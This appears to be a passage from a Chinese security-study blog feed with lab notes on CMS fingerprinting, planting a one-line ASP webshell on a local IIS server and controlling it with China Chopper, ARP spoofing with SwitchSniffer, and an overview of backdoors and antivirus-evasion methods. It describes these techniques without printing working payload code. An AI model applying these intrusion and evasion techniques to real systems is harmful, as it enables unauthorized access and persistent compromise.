(源码功能决定它的漏洞,源码可上网站下载或者第三方下载，第三方能下载到的源码比网站下载到的大众型源码更全面些)</span><br><span class="line"></span><br><span class="line">其他补充</span><br><span class="line">    框架或非框架 ==&gt;框架漏洞或无框架下一步思路(框架漏洞或者代码漏洞)</span><br><span class="line">    CMS识别     ==&gt;人工，工具，平台识别  </span><br><span class="line">    开源或内部</span><br><span class="line">        开源-直接找漏洞或者审计(查出CMS的名字，到网上下载开源模板挖掘漏洞，也可以使用别人发现的漏洞)</span><br><span class="line"></span><br><span class="line">        内部-尝试渗透测试(不是开源的走常规渗透流程)</span><br><span class="line"></span><br><span class="line">    源码获取    ==&gt;备份获取，CMS识别后获取，特定源码特定渠道。</span><br><span class="line">    ...</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="CMS识别"><a href="#CMS识别" class="headerlink" title="CMS识别"></a>CMS识别</h1><p>注：未经授权对网站进行扫描是犯法的，也包括CMS扫描。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">HTTP响应头检测：检查网站响应头中的Server字段和X-Powered-By字段，通过判断这些字段来确定网站所使用的CMS。</span><br><span class="line"></span><br><span class="line">页面关键词检测：检查网站页面源代码中是否包含特定的CMS关键词，例如WordPress、Joomla等。</span><br><span class="line"></span><br><span class="line">URL路径检测：检查网站的URL路径，包括网站首页、登录页面、管理页面等，判断是否为特定的CMS所特有的路径结构。</span><br><span class="line"></span><br><span class="line">页面元素检测：检查网站页面中是否包含特定的CMS所特有的HTML元素或JavaScript脚本等，例如WordPress中常用的wp-content路径结构。</span><br><span class="line"></span><br><span class="line">指纹识别：使用指纹识别工具，对网站进行全面的指纹扫描，识别出网站所使用的CMS、Web服务器、操作系统等信息。</span><br><span class="line"></span><br><span class="line">厂商公告：查阅CMS厂商的官方网站或邮件列表，获取最新的CMS信息、漏洞信息、补丁信息等。</span><br><span class="line"></span><br><span class="line">社区讨论：参与CMS相关的社区或论坛，了解最新的CMS动态、漏洞情报、安全建议等。</span><br><span class="line"></span><br><span class="line">外部资源：利用第三方资源，如漏洞库、CMS识别数据库等，获取最新的CMS信息和漏洞情报。</span><br></pre></td></tr></table></figure><h2 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h2><h3 id="ASP，PHP源码分析"><a href="#ASP，PHP源码分析" class="headerlink" title="ASP，PHP源码分析"></a>ASP，PHP源码分析</h3><h4 id="识别CMS有"><a href="#识别CMS有" class="headerlink" title="识别CMS有"></a>识别CMS有</h4><p>人工观察</p><ul><li>手工识别，看网站是哪种文件的index，再识别网站的某些关键字辨别CMS框架</li><li>当遇到类似的源码框架时，可以自己去下载一个雷同的框架，找到对应的账号密码存放点，找到了开源框架下的账密默认存放位置后，就可以尝试对使用这个开源框架的服务端对应默认位置进行破解了</li></ul><p>工具(需要长期更新和维护)</p><ul><li>一般cms都有特定的文件，只需要识别特定的文件便可以判断</li><li>扫描CMS特有文件是否存，再判断是什么CMS库</li><li>字典：<a href="https://github.com/Lucifer1993/cmsprint">Lucifer</a> <a href="https://www.ddosi.org/b244/">ddosi</a></li><li>懒得上网去下cms字典的话可以在我这下，可能不会实时更新。<a href="Lucifer.txt">Lucifer</a> <a href="ddosi.txt">ddosi</a></li><li><a href="ddosi.txt">ddosi</a>大量使用md5值进行比对，导出网站的logo，使用cmd命令”certutil -hashfile 文件名称 MD5”进行获取</li></ul><p>平台</p><ul><li>在线识别链接地址 ：<a href="https://www.yunsee.cn/">云悉</a> | <a href="http://whatweb.bugscaner.com/look/">聚名whatweb</a> </li><li>小众型/违法类的可能扫不出来，需要自己去学习跟进更新字典库，这样子就识别得出来了。</li></ul><p><img src="c4.jpg" alt="ddosi"></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEC学习-0004-基础</title>
      <link href="/2023/03/10/SEC-Study-0004/"/>
      <url>/2023/03/10/SEC-Study-0004/</url>
      
        <content type="html"><![CDATA[<p>搭建本地拓展：<br>IP扫描与域名扫描的区别<br>iis环境搭建ASP后门</p><span id="more"></span><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#ASP，PHP，ASPX，JSP，PY，JAVAWEB等环境</span></span><br><span class="line"><span class="comment">#WEB源码中敏感文件</span></span><br><span class="line">后台路径，数据库配置文件，备份文件等</span><br><span class="line"><span class="comment">#IP或域名解析WEB源码目录对下的存在的安全问题域名访问，IP访问(结合类似备份文件目录)</span></span><br><span class="line"><span class="comment">#脚本后缀对应解析(其他格式可相同-上传安全#存在下载或为解析问题</span></span><br><span class="line"><span class="comment">#常见防护中的IP验证，域名验证等</span></span><br><span class="line"><span class="comment">#后门是否给予执行权限14</span></span><br><span class="line"><span class="comment">#后门是否给予操作目录或文件权限</span></span><br><span class="line"><span class="comment">#后门是否给予其他用户权限</span></span><br></pre></td></tr></table></figure><h1 id="IP扫描与域名扫描的区别"><a href="#IP扫描与域名扫描的区别" class="headerlink" title="IP扫描与域名扫描的区别"></a>IP扫描与域名扫描的区别</h1><p>简单来讲，同个目录下的所有网站都能访问。<br>IP地址访问网站:提高了访问的层级性。</p><p>也就是说，IP地址的访问范围比域名大。<br><img src="c1.jpg" alt="说明"></p><p>如果限定到域名的话，就只能访问域名对应的网站文件夹了。<br>说白了，域名是定死到www下的某个文件夹的，访问范围缩小了一层。<br>www目录存放网站目录，也可能存在存放网站目录备份文件。域名无法访问获取这个备份文件。IP地址访问则存在这个文件。<br>IP地址对应的是www目录，域名对应的是www目录下的网站目录。</p><h1 id="iis环境搭建ASP后门"><a href="#iis环境搭建ASP后门" class="headerlink" title="iis环境搭建ASP后门"></a>iis环境搭建ASP后门</h1><h2 id="准备环境"><a href="#准备环境" class="headerlink" title="准备环境"></a>准备环境</h2><p>首先准备一个网站，可以正常访问的那种。<br>使用我Windows server2019搭建网站，意思到了就行。<br><img src="c2.jpg" alt="pyg"></p><p>在服务器根目录放个一句话ASP木马<br><img src="c4.jpg" alt="pyg"></p><h2 id="菜刀连接"><a href="#菜刀连接" class="headerlink" title="菜刀连接"></a>菜刀连接</h2><p>使用菜刀进行连接<br><img src="c5.jpg" alt="pyg"><br><img src="c6.jpg" alt="pyg"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>连接完成后嘛……<br>ʕ•̀ ω • ʔ我们就能在网站的操作目录那边随便霍霍了！<br>（现实肯定不能这么搞哈，服务器日志对修改是有记录的）</p><h3 id="拒绝权限"><a href="#拒绝权限" class="headerlink" title="拒绝权限"></a>拒绝权限</h3><h4 id="无法写入"><a href="#无法写入" class="headerlink" title="无法写入"></a>无法写入</h4><p>如果写入权限被拒，则无法新建和写入文件。<br>换个目录写入木马。</p><h4 id="无法执行"><a href="#无法执行" class="headerlink" title="无法执行"></a>无法执行</h4><p>部分文件夹不给执行权限时(images目录)，即便是把脚本放到服务器去也是无法运行的。(脚本执行权限设置为无)<br>=&gt;绕过的思路：放到其他可执行目录</p><h4 id="iis服务器的asp解析文件"><a href="#iis服务器的asp解析文件" class="headerlink" title="iis服务器的asp解析文件"></a>iis服务器的asp解析文件</h4><p>插一张老师的图，这是能使用菜刀成功访问的根本原因(asp解析文件)。<br>将指定的文件后缀设置为asp解析文件对应的dll文件时，这个后缀就会对应的被解析为asp文件。<br><img src="c3.jpg" alt="background"></p><p>举个简单的例子：</p><blockquote><p>我在服务端放一个&quot;student.sywszsec&quot;的文件，并且在服务端将&quot;.sywszsec&quot;对应的解析文件配置为asp的&quot;.dll&quot;时，就会出现&quot;student.sywszsec&quot;被解析为asp文件的情况。<br>如果配置的解析文件被删除掉，解析就会出问题 <span style="color:red;font-size:8px"><strong>(老师的winserver2003功能真的好直观呐~)</strong> </span>.</p></blockquote><h1 id="中间件漏洞"><a href="#中间件漏洞" class="headerlink" title="中间件漏洞"></a>中间件漏洞</h1><p>上面的也是属于中间件漏洞。</p><p>网站中间件识别：通过抓包的报头。</p><p>一键搭建中间件漏洞靶场<br>点我前往<a href="https://www.vulhub.org/">漏洞靶场</a>。这个漏洞的靶场会涉及docker操作，最好有一定的Linux基础和docker基础。</p><p>Web中间件常见漏洞相关资料<br><a href="Web%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93.pdf">点我下载</a>Web中间件常见漏洞总结</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEC-工具学习-0001-X-Scan,SwitchSniffer</title>
      <link href="/2023/03/09/SEC-tool-0001/"/>
      <url>/2023/03/09/SEC-tool-0001/</url>
      
        <content type="html"><![CDATA[<p>今日接触的工具：<br>X-Scan,SwitchSniffer</p><span id="more"></span><h1 id="SwitchSniffer"><a href="#SwitchSniffer" class="headerlink" title="SwitchSniffer"></a>SwitchSniffer</h1><p>环境说明：搭建的环境为Windows 7 ，且环境可能欠缺.dll文件。<br>个人能力有限，找不到对应到win10甚至更高版本的SwitchSniffer。<br><a href="SwitchSniffer.zip">点我下载SwitchSniffer</a></p><p>这个工具的功能目前能达到的是实现arp欺骗，其他暂且等待后续学习。</p><p>先搭建一台Windows7专业版的虚拟机，默认使用dhcp分配IP地址，然后尝试建立tcp连接，将SwitchSniffer传上去。</p><h2 id="搭建ftp"><a href="#搭建ftp" class="headerlink" title="搭建ftp"></a>搭建ftp</h2><p>搭建Windows7专业版虚拟机我就不赘述了，这里讲下ftp。</p><p>为什么要搭建ftp？因为Windows7无法安装vmtools，无法直接将文件拖拽入虚拟机。</p><h3 id="进入并且安装功能"><a href="#进入并且安装功能" class="headerlink" title="进入并且安装功能"></a>进入并且安装功能</h3><p>打开控制面板，打开 <strong>&quot;程序&quot;</strong> ,打开 <strong>&quot;程序和功能&quot;</strong> 下的”打开或关闭Windows功能”。<br><img src="c1.jpg" alt="打开控制面板"><br><img src="c2.jpg" alt="准备安装功能"></p><p>按下图的功能勾选上(有iis,tcp,http)，安装tcp功能。<br><img src="c3.jpg" alt="开始安装功能"><br><img src="c4.jpg" alt="开始安装功能"></p><p>安装完成后，打开控制面板，打开 <strong>&quot;系统与安全&quot;</strong> 的 <strong>&quot;管理工具&quot;</strong><br><img src="c5.jpg" alt="开始安装功能"></p><h3 id="开始搭建FTP"><a href="#开始搭建FTP" class="headerlink" title="开始搭建FTP"></a>开始搭建FTP</h3><p>右键新建FTP站点，后按下图操作即可。自己的虚拟机不需要身份认证，传个文件而已。<br><img src="c5.jpg" alt="FTP站点"><br><img src="c6.jpg" alt="FTP站点"><br><img src="c7.jpg" alt="FTP站点"><br><img src="c8.jpg" alt="FTP站点"><br><img src="c9.jpg" alt="FTP站点"><br><img src="c10.jpg" alt="FTP站点"></p><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>放文件上去，在本机上测试一下。<br><img src="c11.jpg" alt="FTP站点"><br><img src="c12.jpg" alt="FTP站点"><br>现在就可以把软件传上去了。</p><h2 id="安装工具"><a href="#安装工具" class="headerlink" title="安装工具"></a>安装工具</h2><p>过程简单，一路next就行。</p><p>下面讲下会遇到的一个问题：<br><img src="c13.jpg" alt="工具"><br><img src="c14.jpg" alt="工具"></p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p><img src="c20.jpg" alt="使用"><br>使用时，如果正常应该不会报错。<br>但我是报下面的错误，看样子应该是软件编码时有问题，这个暂时没法解决。</p><p>总结下，这个软件操作流程比较简单，功能也比较简单，就是对环境有点”苛刻”……</p><h1 id="X-Scan"><a href="#X-Scan" class="headerlink" title="X-Scan"></a>X-Scan</h1><p>开源的漏洞扫描器<a href="X-Scan-v3.1.rar">点我下载</a></p><p>提个醒：这扫描器某些安全软件会报毒，最好塞虚拟机里用。</p><p>这个就很方便了，win10也支持,结果输出到浏览器显示。</p><p>(⁼̴̀д⁼̴ )这算是操作最简单的那个了吧……</p><p><img src="c21.jpg" alt="X-Scan-v3.1"><br><img src="c22.jpg" alt="X-Scan-v3.1"></p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEC </tag>
            
            <tag> tool </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEC学习-0003-基础</title>
      <link href="/2023/03/08/SEC-Study-0003/"/>
      <url>/2023/03/08/SEC-Study-0003/</url>
      
        <content type="html"><![CDATA[<p>脚本语言,后门,WEB安全漏洞</p><span id="more"></span><h1 id="脚本语言"><a href="#脚本语言" class="headerlink" title="脚本语言"></a>脚本语言</h1><h2 id="常见脚本语言概述"><a href="#常见脚本语言概述" class="headerlink" title="常见脚本语言概述"></a>常见脚本语言概述</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">常见的脚本语言有：</span><br><span class="line"></span><br><span class="line">PHP:        通用的服务器端脚本语言，可以嵌入HTML中使用，也可以用来开发独立的命令行应用程序。</span><br><span class="line">Python：    一种高级编程语言，具有简洁明了的语法和强大的库支持。</span><br><span class="line">JavaScript：一种用于网页开发的脚本语言，可用于开发交互式网页和跨平台应用程序。</span><br><span class="line">Ruby：      一种简单的面向对象编程语言，强调可读性和简洁性。</span><br><span class="line">Perl：      一种灵活、可扩展的编程语言，被广泛用于文本处理和系统管理。</span><br><span class="line">Bash：      一种运行在Unix和Linux操作系统上的脚本语言，用于编写各种脚本和系统管理任务。</span><br><span class="line">Lua：       一种轻量级、高效的嵌入式脚本语言，被广泛用于游戏开发和嵌入式系统。</span><br><span class="line">JSP:        （JavaServer Pages）一种基于Java技术的服务器端脚本语言，它可以用于创建动态Web页面。它的本质是一个Servlet，通过Java代码来生成HTML代码。</span><br><span class="line"></span><br><span class="line">ASPX:       （Active Server Pages Extended）是Microsoft ASP.NET技术中的一种Web页面技术</span><br><span class="line">            它使用C#或VB.NET等编程语言编写，可以被视为服务器端脚本语言。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">不是脚本语言：</span><br><span class="line">JavaWeb:    ，它是一种使用Java语言编写的Web应用程序开发框架。</span><br><span class="line">            JavaWeb开发通常需要使用Java语言以及其他相关的技术和工具，如Servlet、JSP、JDBC、Spring、Hibernate等。</span><br><span class="line">            与脚本语言不同，JavaWeb需要在编译后生成Java字节码文件，然后在Web服务器上运行。</span><br><span class="line"></span><br><span class="line">CGI:        （通用网关接口）是一种标准的协议，用于在Web服务器和客户端之间传输数据。</span><br><span class="line">            它定义了Web服务器如何向Web应用程序（通常是脚本语言编写的）发送数据，并接收应用程序处理后返回的数据。</span><br><span class="line">            常见的脚本语言如Perl、Python、Ruby等都可以通过CGI协议与Web服务器进行交互。</span><br></pre></td></tr></table></figure><h2 id="脚本语言对应的框架-概述"><a href="#脚本语言对应的框架-概述" class="headerlink" title="脚本语言对应的框架(概述)"></a>脚本语言对应的框架(概述)</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Python:     Django,Flask,Tornado,Pyramid,Bottle,TurboGears等</span><br><span class="line">Ruby:       Ruby on Rails,Sinatra,Hanami等</span><br><span class="line">JavaScript: Node.js,Express.js,Meteor.js,Sails.js,React, Angular, Vue.js等</span><br><span class="line">PHP:        Laravel,Symfony,CodeIgniter,Yii,CakePHP,Zend Framework等</span><br><span class="line">Perl:       Catalyst,Dancer2,Mojolicious等</span><br><span class="line">Lua:        OpenResty, Lapis, Sailor</span><br><span class="line">Bash:       ShellCheck, Bash Infinity</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="脚本语言与安全漏洞的关系"><a href="#脚本语言与安全漏洞的关系" class="headerlink" title="脚本语言与安全漏洞的关系"></a>脚本语言与安全漏洞的关系</h2><blockquote><p>(1)程序源代码编程语言的选取决定漏洞的类型、概率<br>(2)程序源码偏重不同：php适合小众开发，java适合大型开发</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JavaScript：    JavaScript是前端开发的主要语言，但也经常被攻击者用来实施恶意攻击，例如跨站脚本攻击（XSS）。</span><br><span class="line">                攻击者利用JavaScript代码注入到网页中，从而在受害者的浏览器上执行恶意代码，</span><br><span class="line">                例如窃取用户的cookie、密码等敏感信息。</span><br><span class="line"></span><br><span class="line">PHP：           PHP是一种常见的服务器端语言，但也容易受到SQL注入、文件包含、代码执行等漏洞的攻击。</span><br><span class="line">                攻击者利用这些漏洞，可以在服务器上执行恶意代码、窃取敏感信息等。</span><br><span class="line"></span><br><span class="line">Python：        Python是一种广泛使用的脚本语言，但也存在一些安全漏洞，例如XML外部实体注入（XXE）、命令注入、代码注入等。</span><br><span class="line">                攻击者利用这些漏洞，可以在服务器上执行恶意代码、窃取敏感信息等。</span><br><span class="line"></span><br><span class="line">Ruby：          Ruby是一种面向对象的脚本语言，但也存在一些安全漏洞，例如跨站脚本攻击、SQL注入、文件包含等。</span><br><span class="line">                攻击者利用这些漏洞，可以在服务器上执行恶意代码、窃取敏感信息等。</span><br><span class="line"></span><br><span class="line">Perl：          Perl是一种通用的脚本语言，但也存在一些安全漏洞，例如跨站脚本攻击、代码注入、文件包含等。</span><br><span class="line">                攻击者可以利用这些漏洞，来执行恶意代码或者窃取敏感信息。</span><br><span class="line"></span><br><span class="line">Bash：          Bash是一个常用的Unix shell，但也存在一些安全漏洞，例如代码注入、文件包含、命令注入等。</span><br><span class="line">                攻击者可以利用这些漏洞，在系统上执行恶意代码或者窃取敏感信息。</span><br><span class="line"></span><br><span class="line">Lua：           Lua是一种轻量级的脚本语言，但也存在一些安全漏洞，例如代码注入、远程代码执行等。</span><br><span class="line">                攻击者可以利用这些漏洞，在服务器上执行恶意代码或者窃取敏感信息。</span><br><span class="line"></span><br><span class="line">PowerShell：    PowerShell是一种命令行脚本语言，但也存在一些安全漏洞，例如代码注入、命令注入、XML注入等。</span><br><span class="line">                攻击者可以利用这些漏洞，在系统上执行恶意代码或者窃取敏感信息。</span><br></pre></td></tr></table></figure><h2 id="漏洞挖掘代码审计与脚本类型的关系"><a href="#漏洞挖掘代码审计与脚本类型的关系" class="headerlink" title="漏洞挖掘代码审计与脚本类型的关系"></a>漏洞挖掘代码审计与脚本类型的关系</h2><blockquote><p>(1)和对应的编程语言代码都有关系<br>(2)对这类语言代码函数等的应用都有关系</p></blockquote><h3 id="常见的脚本类型及其相关的漏洞类型"><a href="#常见的脚本类型及其相关的漏洞类型" class="headerlink" title="常见的脚本类型及其相关的漏洞类型"></a>常见的脚本类型及其相关的漏洞类型</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP：PHP是一种常用的Web开发语言，常见的漏洞类型包括SQL注入、XSS攻击、文件包含漏洞、代码执行漏洞等。</span><br><span class="line">Python：Python是一种通用编程语言，常用于Web开发、数据分析等领域，常见的漏洞类型包括代码注入、路径遍历漏洞、命令执行漏洞等。</span><br><span class="line">JavaScript：JavaScript是一种常用的客户端脚本语言，常见的漏洞类型包括DOM-based XSS攻击、反射型XSS攻击、基于事件的漏洞等。</span><br><span class="line">Ruby：Ruby是一种动态编程语言，常用于Web开发和系统管理，常见的漏洞类型包括SQL注入、XSS攻击、代码执行漏洞等。</span><br><span class="line">Lua：Lua是一种轻量级的脚本语言，常用于游戏开发、嵌入式系统等领域，常见的漏洞类型包括代码注入、格式化字符串漏洞等。</span><br><span class="line">Perl：Perl是一种通用的脚本语言，常用于Web开发、系统管理等领域，常见的漏洞类型包括命令注入漏洞、文件包含漏洞、代码执行漏洞等。</span><br><span class="line">Bash：Bash是一种Unix/Linux系统下的脚本语言，常用于系统管理和自动化任务，常见的漏洞类型包括命令注入漏洞、环境变量注入漏洞等。</span><br><span class="line">PowerShell：PowerShell是微软公司开发的一种脚本语言，常用于Windows系统管理和自动化任务，常见的漏洞类型包括代码注入漏洞、反序列化漏洞等。</span><br></pre></td></tr></table></figure><h1 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h1><h2 id="后门是什么？有哪些后门？"><a href="#后门是什么？有哪些后门？" class="headerlink" title="后门是什么？有哪些后门？"></a>后门是什么？有哪些后门？</h2><p>后门（Backdoor）指的是一种意图隐藏在计算机系统中的软件或技术，它通常用于绕过正常的安全措施，从而使攻击者能够在系统中实施恶意活动。后门通常被安装在系统中的某个不易察觉的地方，例如操作系统、应用程序、网络协议等，从而使攻击者能够远程控制系统、窃取敏感信息、破坏系统功能等。</p><blockquote><p><strong>=&gt;</strong> 利用已知的漏洞或弱点进入系统，或者通过社交工程、钓鱼攻击等方式获取管理员权限并安装后门.</p></blockquote><p>简单来讲，偷偷开个门偷偷搞事情(doge)😂</p><h3 id="网站后门"><a href="#网站后门" class="headerlink" title="网站后门"></a>网站后门</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Webshell后门：Webshell是一种可执行的脚本，可以将其嵌入到网站中，从而使攻击者能够远程访问和控制受感染的网站。</span><br><span class="line">             Webshell通常使用脚本语言编写，例如PHP、ASP、JSP等，攻击者可以通过Web浏览器或者其他远程工具进行访问和控制。</span><br><span class="line"></span><br><span class="line">文件上传后门：攻击者可以通过文件上传漏洞将恶意文件上传到受感染的网站上，然后通过远程访问这些文件来实现对网站的控制。</span><br><span class="line"></span><br><span class="line">SQL注入后门：攻击者可以利用SQL注入漏洞将恶意代码注入到网站的数据库中，然后通过执行这些代码来远程控制网站。</span><br><span class="line"></span><br><span class="line">逻辑漏洞后门：逻辑漏洞是指网站应用程序的设计或实现问题，攻击者可以利用这些漏洞来绕过网站的安全措施，</span><br><span class="line">            并将恶意代码或文件上传到网站上，从而实现对网站的控制。</span><br></pre></td></tr></table></figure><h2 id="后门在安全测试中的实际意义"><a href="#后门在安全测试中的实际意义" class="headerlink" title="后门在安全测试中的实际意义"></a>后门在安全测试中的实际意义</h2><ol><li>留后门：下次更方便的进来（至于为什么，懂的都懂）</li><li>一种操作的管道。</li><li>目的：更隐蔽的控制你</li><li>深知攻击行为，然后再去反侦察，找到攻击源。</li></ol><h2 id="后门需要了解什么？有哪些玩法？"><a href="#后门需要了解什么？有哪些玩法？" class="headerlink" title="后门需要了解什么？有哪些玩法？"></a>后门需要了解什么？有哪些玩法？</h2><ol><li>打开后直接触发等等</li><li>隐匿控制（看你目的）</li><li>免杀：正常的隐蔽文件，避免被安全软件杀掉。（核心）</li></ol><h3 id="免杀-很重要！"><a href="#免杀-很重要！" class="headerlink" title="免杀(很重要！)"></a>免杀(很重要！)</h3><blockquote><p><strong>免杀（AV evasion）</strong> 是指恶意软件（如病毒、木马、间谍软件等）通过各种技术手段 <strong>绕过</strong> 杀毒软件、防火墙和其他 <strong>安全措施</strong> 的攻击方式。免杀技术可以让恶意软件避免被检测和拦截，从而更好地完成攻击行为。</p></blockquote><h4 id="常见的免杀技术"><a href="#常见的免杀技术" class="headerlink" title="常见的免杀技术"></a>常见的免杀技术</h4><blockquote><p><strong>加密和压缩</strong> ：恶意软件的源代码被加密和压缩，使其难以被检测和分析。</p><p><strong>多次变异</strong> ：恶意软件会在不同的计算机上多次变异，以逃避杀毒软件的检测。变异的方法包括改变代码的结构、函数名称、变量名称等。</p><p><strong>驻留技术</strong> ：恶意软件会利用系统的自启动、服务、驱动程序等功能，将自己隐藏在操作系统的核心部分，使其难以被检测和清除。</p><p><strong>DLL劫持</strong> ：恶意软件利用Windows操作系统加载DLL的方式，将自己伪装成合法的DLL文件，从而在系统启动时自动运行。</p><p><strong>代码注入</strong> ：恶意软件将自己的代码注入到合法的进程中，以此控制系统并执行恶意操作。</p></blockquote><h4 id="免杀的实现方式"><a href="#免杀的实现方式" class="headerlink" title="免杀的实现方式"></a>免杀的实现方式</h4><ol><li><strong>源码免杀</strong> :在有源码的情况下，可以定位特征码、加花指令、多层跳转、加无效指令、替换api、重写api、API伪调用等等，这部分内容较多且复杂</li><li><strong>无源码免杀</strong> :在源码不好修改需要对exe进行免杀时，可以加资源、替换资源、加壳、加签名、PE优化、增加节数据等等。</li><li><strong>powershell免杀</strong> :因为mimikatz有powershell版或者使用powershell可以加载，所以对powershell的脚本免杀也是一种方式。</li><li><strong>加载器分离免杀</strong> :加载器就是利用了ShellCode和PE分离的方式来达到免杀的效果，不过很多只能加载基于RAW格式或固定格式的shellcode，对exe程序就无能无力了。</li><li><strong>白名单免杀</strong> :白名单主要是使用了rundll32、msbuild、mshta、cscript等多个白名单程序来加载嵌入了木马的jscript脚本</li></ol><h1 id="WEB（非常重要）"><a href="#WEB（非常重要）" class="headerlink" title="WEB（非常重要）"></a>WEB（非常重要）</h1><h2 id="web组成架构模型"><a href="#web组成架构模型" class="headerlink" title="web组成架构模型"></a>web组成架构模型</h2><p>网站组成四部分，以后要思考漏洞在哪个层面。</p><h3 id="网站源码（网站攻击比较多）"><a href="#网站源码（网站攻击比较多）" class="headerlink" title="网站源码（网站攻击比较多）"></a>网站源码（网站攻击比较多）</h3><p>① 脚本类型<br>② 应用方向 — 决定了攻击的方式（方向不同，写代码的函数也不同，漏洞也会因此不同）</p><h3 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h3><blockquote><p>=&gt; Windows Linux MacOS</p></blockquote><h3 id="中间件（搭建平台）"><a href="#中间件（搭建平台）" class="headerlink" title="中间件（搭建平台）"></a>中间件（搭建平台）</h3><p>Apache IIS Tomcat Niginx等</p><h3 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h3><p>Access mysql Mysql Oracle Sybase Db2 postsql</p><h2 id="架构漏洞安全测试简要介绍？"><a href="#架构漏洞安全测试简要介绍？" class="headerlink" title="架构漏洞安全测试简要介绍？"></a>架构漏洞安全测试简要介绍？</h2><ol><li>漏洞就在上面的四种类型</li><li>以后挖洞时要体会那属于哪个层面</li><li>重点：以后搞漏洞时要注意漏洞有什么前提条件</li></ol><h2 id="为什么要从web层面为首"><a href="#为什么要从web层面为首" class="headerlink" title="为什么要从web层面为首"></a>为什么要从web层面为首</h2><ol><li>Web主流，可以web得权提权</li><li>有时候即使有操作系统漏洞，没满足一定条件，知道了也没用。</li><li>某些软件一定程度上也是通过web浏览器包装的，解析出来就是一个纯粹的web页面</li></ol><h1 id="WEB安全漏洞"><a href="#WEB安全漏洞" class="headerlink" title="WEB安全漏洞"></a>WEB安全漏洞</h1><h2 id="WEB源码层面的漏洞"><a href="#WEB源码层面的漏洞" class="headerlink" title="WEB源码层面的漏洞"></a>WEB源码层面的漏洞</h2><ol><li>SQL注入/XSS/文件上传/代码执行/变量覆盖/逻辑漏洞/反序列化等</li></ol><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">常见web源码漏洞</span><br><span class="line">    git 源码泄露</span><br><span class="line">    svn 源码泄露</span><br><span class="line">    hg  源码泄漏</span><br><span class="line">    网站备份压缩文件</span><br><span class="line">    WEB-INF/web.xml 泄露</span><br><span class="line">    DS_Store文件泄露</span><br><span class="line">    SWP 文件泄露</span><br><span class="line">    CVS泄露</span><br><span class="line">    Bzr泄露</span><br><span class="line">    GitHub源码泄漏</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">web层面常见漏洞类型</span><br><span class="line"></span><br><span class="line">SQL注入漏洞：攻击者在输入的数据中注入SQL代码，从而让服务器执行恶意代码，可以获取敏感数据，修改数据库等。</span><br><span class="line">XSS漏洞：攻击者在网站的输出页面上注入恶意脚本，使得其他用户在访问这个页面时，会执行这些恶意脚本，从而获取敏感数据。</span><br><span class="line">文件上传漏洞：攻击者上传恶意文件到服务器上，可能导致服务器被入侵、系统被控制等。</span><br><span class="line">代码执行漏洞：攻击者可以通过构造恶意输入，使得服务器执行一些非预期的代码，从而达到攻击目的。</span><br><span class="line">变量覆盖漏洞：攻击者通过修改变量的值，可以影响程序的正常运行，甚至导致系统崩溃。</span><br><span class="line">逻辑漏洞：程序中存在漏洞，可以被攻击者利用来实现攻击目的，如越权访问、绕过认证等。</span><br><span class="line">反序列化漏洞：攻击者可以利用对象序列化的漏洞，构造恶意数据来攻击服务器。</span><br></pre></td></tr></table></figure><h2 id="WEB中间件层面的漏洞"><a href="#WEB中间件层面的漏洞" class="headerlink" title="WEB中间件层面的漏洞"></a>WEB中间件层面的漏洞</h2><ol><li>未授权访问等</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">（一） IIS</span><br><span class="line"><span class="number">1</span>、PUT漏洞</span><br><span class="line"><span class="number">2</span>、短文件名猜解</span><br><span class="line"><span class="number">3</span>、远程代码执行</span><br><span class="line"><span class="number">4</span>、解析漏洞</span><br><span class="line">（二） Apache</span><br><span class="line"><span class="number">1</span>、解析漏洞</span><br><span class="line"><span class="number">2</span>、目录遍历</span><br><span class="line">（三） Nginx</span><br><span class="line"><span class="number">1</span>、文件解析</span><br><span class="line"><span class="number">2</span>、目录遍历</span><br><span class="line"><span class="number">3</span>、CRLF注入</span><br><span class="line"><span class="number">4</span>、目录穿越</span><br><span class="line">（四）Tomcat</span><br><span class="line"><span class="number">1</span>、远程代码执行</span><br><span class="line"><span class="number">2</span>、war后门文件部署</span><br><span class="line">（五）jBoss</span><br><span class="line"><span class="number">1</span>、反序列化漏洞</span><br><span class="line"><span class="number">2</span>、war后门文件部署</span><br><span class="line">（六）WebLogic</span><br><span class="line"><span class="number">1</span>、反序列化漏洞</span><br><span class="line"><span class="number">2</span>、SSRF</span><br><span class="line"><span class="number">3</span>、任意文件上传</span><br><span class="line"><span class="number">4</span>、war后门文件部署</span><br><span class="line">（七）其它中间件相关漏洞</span><br><span class="line"><span class="number">1</span>、FastCGI未授权访问、任意命令执行</span><br><span class="line"><span class="number">2</span>、PHPCGI远程代码执行</span><br></pre></td></tr></table></figure><h2 id="WEB数据库层面的漏洞"><a 